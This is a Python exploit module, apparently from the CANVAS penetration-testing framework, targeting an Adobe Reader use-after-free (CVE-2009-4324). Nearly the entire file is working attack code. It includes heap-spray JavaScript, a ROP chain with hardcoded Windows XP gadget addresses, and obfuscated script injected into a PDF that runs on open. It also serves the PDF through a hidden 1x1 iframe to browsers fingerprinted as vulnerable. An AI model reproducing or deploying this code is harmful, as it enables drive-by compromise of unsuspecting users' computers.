#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from encoder import chunkedaddencoder
from libs.ua_parser import user_agent_parser

NAME="acrobat_newplayer"
DESCRIPTION='Adobe Acrobat Reader Use After Free (DocMedia.newplayer)'

DOCUMENTATION={}
DOCUMENTATION['Date public']='12/14/2009'
DOCUMENTATION['References']='http://blogs.adobe.com/psirt/2009/12/new_adobe_reader_and_acrobat_v.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Acrobat Reader <=8.1.7 and <=9.2'
DOCUMENTATION['CVE Name']='CVE-2009-4324'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4324"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['VENDOR']='Adobe'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3 English with Adobe Acrobat Reader 9.2

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:acrobat_newplayer -l 172.17.1.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

targets={
    #NtProtectVirtualMemory, LEA ESP,EDX....RETN 10
    0: ['Autodetect',0],
    1: ['Windows XP SP3 English',0x7C90D6EE,0x7C915745],
    2: ['Windowx XP SP3 French', 0x7C91D6EE,0x7C925745],
}

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=None
        
        self.badstring='\0\xff'
        self.name=NAME
        self.htmlfilename='file.html'

        self.source_pdf     = 'Resources/blank.pdf'
        self.dest_pdf       = 'temp.pdf'
        
        self.HTTPMOSDEF = False
        self.searchcode_vprotect = True
        self.searchcode_mod_stack = False
        return 

    def is_vulnerable( self, info_dict ):
        #DOCUMENTATION['VersionsAffected']='Acrobat Reader <=8.1.7 and <=9.2'
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if 'Windows' not in parsed['os']['family']:
            return 0
        
        major, minor, build, patch = self.getReaderVersions(info_dict)
        if not major:
            #no Reader
            return 0
        if major == 8:
            if minor <= 1:
                if build <= 7:
                    return 80
                
        if major == 9:
            if minor <= 2:
                if build <= 0:
                    return 80
            
                
        return 0
        
    def makePDF(self):
        self.createWin32ClientsideSearchShellcode()
        
        self.clientversion=self.argsDict.get("clientversion",self.clientversion)
        if not self.clientversion:
            self.log("client version not found, using version")
            self.clientversion=self.version
        self.clientversion=int(self.clientversion)
        if (self.clientversion < 1):
            self.clientversion=1
        self.log('Using version %d'%(self.clientversion))
        name,ntprotect,leaesp = targets[self.clientversion]            

        js="""function repeat(count,what) {
          var v = "";
          while (--count >= 0) v += what;
          return v;
}
function spray(arr, data, bigblock_size, counter) {
  var start=arr.length;
  var realdata=unescape(data);
  var bigblock=realdata;

  while (bigblock.length < bigblock_size) bigblock+=bigblock;
  for (var i=start; i<counter+start; i++) arr[i]=bigblock.substring(0, bigblock_size-4)+bigblock.substring(bigblock_size-4,bigblock_size);
}
function spray2(arr, data, bigblock_size, counter) {
  bigblock_size/=2;
  start=arr.length;
  bigblock="";
  while (bigblock.length+unescape(data).length < bigblock_size) bigblock+=unescape(data);

  for (var i=start; i<counter+start; i++) arr[i]=bigblock+unescape(data);
}

function hexa(val) {
  var str=new Number(val).toString(16);
  while (str.length < 4)  str = "0" + str;
  return str;
}
function myescape(addr) {
  var str="";
  str="%u"+hexa(addr&0xffff)+"%u"+hexa((addr>>16)&0xffff);
  return str;
}

var arr=new Array();

if(app.viewerVersion >= 8) {

base="";

// The bug is triggered via a call [EDX+4] instruction. At that time
// we can force EDX to contain 0x11000820.
base+=myescape(NTPROTECT);  //0820  -> NtProtectVirtualMemory
base+=myescape(LEAESP);     //0824  -> LEA ESP,[EDX].....RETN 10 (EDX=0820)

// Ptr args used for first call to NtProtectVirtualMemory.
base+=myescape(0x00004000); //0828 - n of bytes
base+=myescape(0x11000000); //082C - base page to protect
base+=myescape(0x41414141); //0830 - filler

// First call to NtProtectVirtualMemory to protect the region where
// the searchcode will be
base+=myescape(0x1100084c); //0834 - ret address from NtProtectVirtualMemory
base+=myescape(0xffffffff); //0838 - process
base+=myescape(0x1100082c); //083C - ptr to base to protect
base+=myescape(0x11000828); //0840 - PTR to n of bytes
base+=myescape(0x00000040); //0844 - new prot
base+=myescape(0x1100082c); //0848 - PTR to old prot

base+="SEARCHCODE";          //084C - shellcode

while (base.length < 0x1800) base+="%u4141";

base2=myescape(0x11000820);

spray(arr, base, 0x00100000, 0x08000000/0x00100000);

shellcode="";
shellcode+="SHELLCODE";
sarr=new Array();

spray2(sarr,shellcode,0x50,0x50);
spray2(sarr,shellcode,0x4C,0x50);
spray2(sarr,shellcode,0x54,0x50);
spray2(sarr,shellcode,0x40,0x50);
spray2(sarr,shellcode,0x44,0x50);

try {this.media.newPlayer(null);} catch(e) {}

spray2(arr,base2,0x48,0x50);

spray2(arr,base2,0x50,0x50);
spray2(arr,base2,0x4C,0x50);
spray2(arr,base2,0x54,0x50);
spray2(arr,base2,0x40,0x50);
spray2(arr,base2,0x44,0x50);
}

""".replace('SEARCHCODE',urluencode(self.searchcode)).replace("NTPROTECT","0x%08x"%ntprotect).replace("LEAESP","0x%08x"%leaesp)
        
        js = js.replace('SHELLCODE', urluencode(self.shellcode))
        self.log("Encoded shellcode length : %d" % \
                len(urluencode(self.shellcode)))

        input=PdfFileReader(file(self.source_pdf,'rb'))
        self.setJS(input, js)
        
        page=input.getPage(0)
        output=PdfFileWriter()
        output.addPage(page)
        root=output._root.getObject()
        root.update({NameObject('/Names'):input.trailer['/Root']['/Names']})
        
        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()

    def setJS(self, input, content):
        #create the js entry first
        input.trailer['/Root'][NameObject('/Names')] = DictionaryObject()
        input.trailer['/Root']['/Names'][NameObject('/JavaScript')] = DictionaryObject()
        input.trailer['/Root']['/Names']['/JavaScript'][NameObject('/Names')] = ArrayObject()
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(TextStringObject('Spray'))
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(DictionaryObject())
        input.trailer['/Root'][NameObject('OpenAction')] = DictionaryObject()

        #set the js content
        jsobject = StreamObject()
        jsobject._data = self.obfuscate_javascript(content)
        
        jsdict=input.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/S')] = NameObject('/JavaScript')
        jsdict[NameObject('/JS')] = jsobject.flateEncode()
    
    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<IFRAME src=\"%s\" frameborder=0 scrolling=no width=1 height=1</IFRAME>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            h.addHeader('Content-Type','application/pdf')
            b.setBody(self.makePDF())
        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        fd=file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
